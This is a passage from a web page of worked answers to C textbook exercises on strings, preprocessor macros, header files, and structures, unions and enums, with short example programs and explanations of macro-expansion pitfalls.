class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int read_line(char str[], int n)</span><br><span class="line">{</span><br><span class="line">  int ch, i;</span><br><span class="line"> </span><br><span class="line">  for (i = 0; i &lt; n; i++) {</span><br><span class="line">    ch = getchar();</span><br><span class="line">    if (ch == '\n')</span><br><span class="line">      break;</span><br><span class="line">    str[i] = ch;</span><br><span class="line">  }</span><br><span class="line">  str[i] = '\0';</span><br><span class="line">  return i;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>6.</strong> [was #6] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void censor(char s[])</span><br><span class="line">{</span><br><span class="line">  int i;</span><br><span class="line"> </span><br><span class="line">  for (i = 0; s[i] != '\0'; i++)</span><br><span class="line">    if (s[i] == 'f' &amp;&amp; s[i+1] == 'o' &amp;&amp; s[i+2] =='o')</span><br><span class="line">      s[i] = s[i+1] = s[i+2] = 'x';</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>Note that the short-circuit evaluation of <code>&amp;&amp;</code> prevents the <code>if</code> statement from testing characters that follow the null character. </p><p><strong>8.</strong> [was #10] <code>tired-or-wired?</code></p><p><strong>10.</strong> [was #12] The value of <code>q</code> is undefined, so the call of <code>strcpy</code> attempts to copy the string pointed to by <code>p</code> into some unknown area of memory. Exercise 2 in Chapter 17 discusses how to write this function correctly. </p><p><strong>15.</strong> [was #8] </p><p>(a) 3<br> (b) 0<br> (c) The length of the longest prefix of the string <code>s</code> that consists entirely of characters from the string <code>t</code>. Or, equivalently, the position of the first character in <code>s</code> that is not also in <code>t</code>.</p><p><strong>16.</strong> [was #16] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int count_spaces(const char *s)</span><br><span class="line">{</span><br><span class="line">  int count = 0;</span><br><span class="line"> </span><br><span class="line">  while (*s)</span><br><span class="line">    if (*s++ == ' ')</span><br><span class="line">      count++;</span><br><span class="line">  return count;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="Answers-to-Selected-Programming-Projects-6"><a href="#Answers-to-Selected-Programming-Projects-6" class="headerlink" title="Answers to Selected Programming Projects"></a>Answers to Selected Programming Projects</h4><p><strong>1.</strong> [was #14] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"> </span><br><span class="line">#define WORD_LEN 20</span><br><span class="line"> </span><br><span class="line">void read_line(char str[], int n);</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  char smallest_word[WORD_LEN+1],</span><br><span class="line">       largest_word[WORD_LEN+1],</span><br><span class="line">       current_word[WORD_LEN+1];</span><br><span class="line"> </span><br><span class="line">  printf("Enter word: ");</span><br><span class="line">  read_line(current_word, WORD_LEN);</span><br><span class="line">  strcpy(smallest_word, strcpy(largest_word, current_word));</span><br><span class="line"> </span><br><span class="line">  while (strlen(current_word) != 4) {</span><br><span class="line">    printf("Enter word: ");</span><br><span class="line">    read_line(current_word, WORD_LEN);</span><br><span class="line">    if (strcmp(current_word, smallest_word) &lt; 0)</span><br><span class="line">      strcpy(smallest_word, current_word);</span><br><span class="line">    if (strcmp(current_word, largest_word) &gt; 0)</span><br><span class="line">      strcpy(largest_word, current_word);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  printf("\nSmallest word: %s\n", smallest_word);</span><br><span class="line">  printf("Largest word: %s\n", largest_word);</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">void read_line(char str[], int n)</span><br><span class="line">{</span><br><span class="line">  int ch, i = 0;</span><br><span class="line"> </span><br><span class="line">  while ((ch = getchar()) != '\n')</span><br><span class="line">    if (i &lt; n)</span><br><span class="line">      str[i++] = ch;</span><br><span class="line">  str[i] = '\0';</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>4.</strong> [was #18] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">{</span><br><span class="line">  int i;</span><br><span class="line"> </span><br><span class="line">  for (i = argc - 1; i &gt; 0; i--)</span><br><span class="line">    printf("%s ", argv[i]);</span><br><span class="line">  printf("\n");</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>6.</strong> [was #20] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;ctype.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"> </span><br><span class="line">#define NUM_PLANETS 9</span><br><span class="line"> </span><br><span class="line">int string_equal(const char *s, const char *t);</span><br><span class="line"> </span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">{</span><br><span class="line">  char *planets[] = {"Mercury", "Venus", "Earth",</span><br><span class="line">                     "Mars", "Jupiter", "Saturn",</span><br><span class="line">                     "Uranus", "Neptune", "Pluto"};</span><br><span class="line">  int i, j;</span><br><span class="line"> </span><br><span class="line">  for (i = 1; i &lt; argc; i++) {</span><br><span class="line">    for (j = 0; j &lt; NUM_PLANETS; j++)</span><br><span class="line">      if (string_equal(argv[i], planets[j])) {</span><br><span class="line">        printf("%s is planet %d\n", argv[i], j + 1);</span><br><span class="line">        break;</span><br><span class="line">      }</span><br><span class="line">    if (j == NUM_PLANETS)</span><br><span class="line">      printf("%s is not a planet\n", argv[i]);</span><br><span class="line">  }</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">int string_equal(const char *s, const char *t)</span><br><span class="line">{</span><br><span class="line">  int i;</span><br><span class="line"> </span><br><span class="line">  for (i = 0; toupper(s[i]) == toupper(t[i]); i++)</span><br><span class="line">    if (s[i] == '\0')</span><br><span class="line">      return 1;</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Chapter-14"><a href="#Chapter-14" class="headerlink" title="Chapter 14"></a>Chapter 14</h3><h4 id="Answers-to-Selected-Exercises-9"><a href="#Answers-to-Selected-Exercises-9" class="headerlink" title="Answers to Selected Exercises"></a>Answers to Selected Exercises</h4><p><strong>2.</strong> [was #2] <code>#define NELEMS(a) ((int) (sizeof(a) / sizeof(a[0])))</code> </p><p><strong>4.</strong> [was #4] </p><p>(a) One problem stems from the lack of parentheses around the replacement list. For example, the statement </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = 1/AVG(b, c);</span><br></pre></td></tr></tbody></table></figure><p>will be replaced by </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = 1/(b+c)/2;</span><br></pre></td></tr></tbody></table></figure><p>Even if we add the missing parentheses, though, the macro still has problems, because it needs parentheses around <code>x</code> and <code>y</code> in the replacement list. The preprocessor will turn the statement </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = AVG(b&lt;c, c&gt;d);</span><br></pre></td></tr></tbody></table></figure><p>into </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = ((b&lt;c+c&gt;d)/2);</span><br></pre></td></tr></tbody></table></figure><p>which is equivalent to </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = ((b&lt;(c+c)&gt;d)/2);</span><br></pre></td></tr></tbody></table></figure><p>Here’s the final (corrected) version of the macro: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define AVG(x,y) (((x)+(y))/2)</span><br></pre></td></tr></tbody></table></figure><p>(b) The problem is the lack of parentheses around the replacement list. For example, </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = 1/AREA(b, c);</span><br></pre></td></tr></tbody></table></figure><p>becomes </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = 1/(b)*(c);</span><br></pre></td></tr></tbody></table></figure><p>Here’s the corrected macro: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define AREA(x,y) ((x)*(y))</span><br></pre></td></tr></tbody></table></figure><p><strong>5.</strong> [was #6] </p><p>(a) The call of <code>putchar</code> expands into the following statement: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putchar(('a'&lt;=(s[++i])&amp;&amp;(s[++i])&lt;='z'?(s[++i])-'a'+'A':(s[++i])));</span><br></pre></td></tr></tbody></table></figure><p>The character <code>a</code> is less than or equal to <code>s[1]</code> (which is <code>b</code>), yielding a true condition. The character <code>s[2]</code> (which is <code>c</code>) is less than or equal to <code>z</code>, which is also true. The value printed is <code>s[3]-'a'+'A'</code>, which is <code>D</code> (assuming that the character set is ASCII). </p><p>(b) The character <code>a</code> is not less than or equal to <code>s[1]</code> (which is <code>1</code>) so the test condition is false. The value printed is <code>s[2]</code>, which is <code>2</code>. </p><p><strong>7.</strong> [was #8] </p><p>(a) </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">long long_max(long x, long y)</span><br><span class="line">{</span><br><span class="line">  return x &gt; y ? x : y;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>The preprocessor would actually put all the tokens on one line, but this version is more readable. </p><p>(b) The problem with types such as <code>unsigned</code> <code>long</code> is that they require two words, which prevents <code>GENERIC_MAX</code> from creating the desired function name. For example, <code>GENERIC_MAX(unsigned</code> <code>long)</code> would expand into </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">unsigned long unsigned long_max(unsigned long x, unsigned long y)</span><br><span class="line">{</span><br><span class="line">  return x &gt; y ? x : y;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>(c) To make <code>GENERIC_MAX</code> work with any basic type, use a type definition to rename the type: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef unsigned long ULONG;</span><br></pre></td></tr></tbody></table></figure><p>We can now write <code>GENERIC_MAX(ULONG)</code>. </p><p><strong>12.</strong> [was #10] (c) and (e) will fail, since <code>M</code> is defined. </p><p><strong>14.</strong> [was #12; modified] Here’s what the program will look like after preprocessing: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Blank line</span><br><span class="line">Blank line</span><br><span class="line">Blank line</span><br><span class="line">Blank line</span><br><span class="line">Blank line</span><br><span class="line">Blank line</span><br><span class="line">Blank line</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  int a[= 10], i, j, k, m;</span><br><span class="line"> </span><br><span class="line">Blank line</span><br><span class="line">  i = j;</span><br><span class="line">Blank line</span><br><span class="line">Blank line</span><br><span class="line">Blank line</span><br><span class="line"> </span><br><span class="line">  i = 10 * j+1;</span><br><span class="line">  i = (x,y) x-y(j, k);</span><br><span class="line">  i = ((((j)*(j)))*(((j)*(j))));</span><br><span class="line">  i = (((j)*(j))*(j));</span><br><span class="line">  i = jk;</span><br><span class="line">  puts("i" "j");</span><br><span class="line"> </span><br><span class="line">Blank line</span><br><span class="line">  i = SQR(j);</span><br><span class="line">Blank line</span><br><span class="line">  i = (j);</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>Some preprocessors delete white-space characters at the beginning of a line, so your results may vary. Three lines will cause errors when the program is compiled. Two contain syntax errors: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int a[= 10], i, j, k, m;</span><br><span class="line">i = (x,y) x-y(j, k);</span><br></pre></td></tr></tbody></table></figure><p>The third refers to an undefined variable: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i = jk;</span><br></pre></td></tr></tbody></table></figure><h3 id="Chapter-15"><a href="#Chapter-15" class="headerlink" title="Chapter 15"></a>Chapter 15</h3><h4 id="Answers-to-Selected-Exercises-10"><a href="#Answers-to-Selected-Exercises-10" class="headerlink" title="Answers to Selected Exercises"></a>Answers to Selected Exercises</h4><p><strong>2.</strong> [was #2] (b). Function definitions should not be put in a header file. If a function definition appears in a header file that is included by two (or more) source files, the program can’t be linked, since the linker will see two copies of the function. </p><p><strong>6.</strong> [was #8] </p><p>(a) <code>main.c</code>, <code>f1.c</code>, and <code>f2.c</code>.<br> (b) <code>f1.c</code> (assuming that <code>f1.h</code> is not affected by the change).<br> (c) <code>main.c</code>, <code>f1.c</code>, and <code>f2.c</code>, since all three include <code>f1.h</code>.<br> (d) <code>f1.c</code> and <code>f2.c</code>, since both include <code>f2.h</code>.</p><h3 id="Chapter-16"><a href="#Chapter-16" class="headerlink" title="Chapter 16"></a>Chapter 16</h3><h4 id="Answers-to-Selected-Exercises-11"><a href="#Answers-to-Selected-Exercises-11" class="headerlink" title="Answers to Selected Exercises"></a>Answers to Selected Exercises</h4><p><strong>2.</strong> [was #2; modified] </p><p>(a) </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">struct {</span><br><span class="line">  double real, imaginary;</span><br><span class="line">} c1, c2, c3;</span><br></pre></td></tr></tbody></table></figure><p>(b) </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">struct {</span><br><span class="line">  double real, imaginary;</span><br><span class="line">} c1 = {0.0, 1.0}, c2 = {1.0, 0.0}, c3;</span><br></pre></td></tr></tbody></table></figure><p>(c) Only one statement is necessary: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c1 = c2;</span><br></pre></td></tr></tbody></table></figure><p>(d) </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c3.real = c1.real + c2.real;</span><br><span class="line">c3.imaginary = c1.imaginary + c2.imaginary;</span><br></pre></td></tr></tbody></table></figure><p><strong>4.</strong> [was #4; modified] </p><p>(a) </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">typedef struct {</span><br><span class="line">  double real, imaginary;</span><br><span class="line">} Complex;</span><br></pre></td></tr></tbody></table></figure><p>(b) <code>Complex c1, c2, c3;</code> </p><p>(c) </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Complex make_complex(double real, double imaginary)</span><br><span class="line">{</span><br><span class="line">  Complex c;</span><br><span class="line"> </span><br><span class="line">  c.real = real;</span><br><span class="line">  c.imaginary = imaginary;</span><br><span class="line">  return c;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>(d) </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Complex add_complex(Complex c1, Complex c2)</span><br><span class="line">{</span><br><span class="line">  Complex c3;</span><br><span class="line"> </span><br><span class="line">  c3.real = c1.real + c2.real;</span><br><span class="line">  c3.imaginary = c1.imaginary + c2.imaginary;</span><br><span class="line">  return c3;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>11.</strong> [was #10; modified] The <code>a</code> member will occupy 8 bytes, the union <code>e</code> will take 8 bytes (the largest member, <code>c</code>, is 8 bytes long), and the array <code>f</code> will require 4 bytes, so the total space allocated for <code>s</code> will be 20 bytes. </p><p><strong>14.</strong> [was #12; modified] </p><p>(a) </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">double area(struct shape s)</span><br><span class="line">{</span><br><span class="line">  if (s.shape_kind == RECTANGLE)</span><br><span class="line">    return s.u.rectangle.height * s.u.rectangle.width;</span><br><span class="line">  else</span><br><span class="line">    return 3.14159 * s.u.circle.radius * s.u.circle.radius;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>(b) </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct shape move(struct shape s, int x, int y)</span><br><span class="line">{</span><br><span class="line">  struct shape new_shape = s;</span><br><span class="line"> </span><br><span class="line">  new_shape.center.x += x;</span><br><span class="line">  new_shape.center.y += y;</span><br><span class="line">  return new_shape;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>(c) </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct shape scale(struct shape s, double c)</span><br><span class="line">{</span><br><span class="line">  struct shape new_shape = s;</span><br><span class="line"> </span><br><span class="line">  if (new_shape.shape_kind == RECTANGLE) {</span><br><span class="line">    new_shape.u.rectangle.height *= c;</span><br><span class="line">    new_shape.u.rectangle.width *= c;</span><br><span class="line">  } else</span><br><span class="line">    new_shape.u.circle.radius *= c;</span><br><span class="line"> </span><br><span class="line">  return new_shape;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>15.</strong> [was #14] </p><p>(a) <code>enum week_days {MON, TUE, WED, THU, FRI, SAT, SUN};</code><br> (b) <code>typedef enum {MON, TUE, WED, THU, FRI, SAT, SUN} Week_days;</code> </p><p><strong>17.</strong> [was #16] All the statements are legal, since C allows integers and enumeration values to be mixed without restriction. Only (a), (d), and (e) are safe. (b) is not meaningful if <code>i</code> has a value other than 0 or 1. (c) will not yield a meaningful result if <code>b</code> has the value 1. </p><h4 id="Answers-to-Selected-Programming-Projects-7"><a href="#Answers-to-Selected-Programming-Projects-7" class="headerlink" title="Answers to Selected Programming Projects"></a>Answers to Selected Programming Projects</h4><p><strong>1.</strong> [was #6; modified] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">#define COUNTRY_COUNT \</span><br><span class="line">  ((int) (sizeof(country_codes) / sizeof(country_codes[0])))</span><br><span class="line"> </span><br><span class="line">struct dialing_code {</span><br><span class="line">  char *country;</span><br><span class="line">  int code;</span><br><span class="line">};</span><br><span class="line"> </span><br><span class="line">const struct dialing_code country_codes[] =</span><br><span class="line">  {{"Argentina",            54}, {"Bangladesh",      880},</span><br><span class="line">   {"Brazil",               55}, {"Burma (Myanmar)",  95},</span><br><span class="line">   {"China",                86}, {"Colombia",         57},</span><br><span class="line">   {"Congo, Dem. Rep. of", 243}, {"Egypt",            20},</span><br><span class="line">   {"Ethiopia",            251}, {"France",           33},</span><br><span class="line">   {"Germany",              49}, {"India",            91},</span><br><span class="line">   {"Indonesia",            62}, {"Iran",             98},</span><br><span class="line">   {"Italy",                39}, {"Japan",            81},</span><br><span class="line">   {"Mexico",               52}, {"Nigeria",         234},</span><br><span class="line">   {"Pakistan",             92}, {"Philippines",      63},</span><br><span class="line">   {"Poland",               48}, {"Russia",            7},</span><br><span class="line">   {"South Africa",         27}, {"South Korea",      82},</span><br><span class="line">   {"Spain",                34}, {"Sudan",           249},</span><br><span class="line">   {"Thailand",             66}, {"Turkey",           90},</span><br><span class="line">   {"Ukraine",             380}, {"United Kingdom",   44},</span><br><span class="line">   {"United States",         1}, {"Vietnam",          84}};</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  int code, i;</span><br><span class="line"> </span><br><span class="line">  printf("Enter dialing code: ");</span><br><span class="line">  scanf("%d", &amp;code);</span><br><span class="line"> </span><br><span class="line">  for (i = 0; i &lt; COUNTRY_COUNT; i++)</span><br><span class="line">    if (code == country_codes[i].code) {</span><br><span class="line">      printf("The country with dialing code %d is %s\n",</span><br><span class="line">             code, country_codes[i].country);</span><br><span class="line">      return 0;</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line">  printf("No corresponding country found\n");</span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>3.</strong> [was #8] </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span 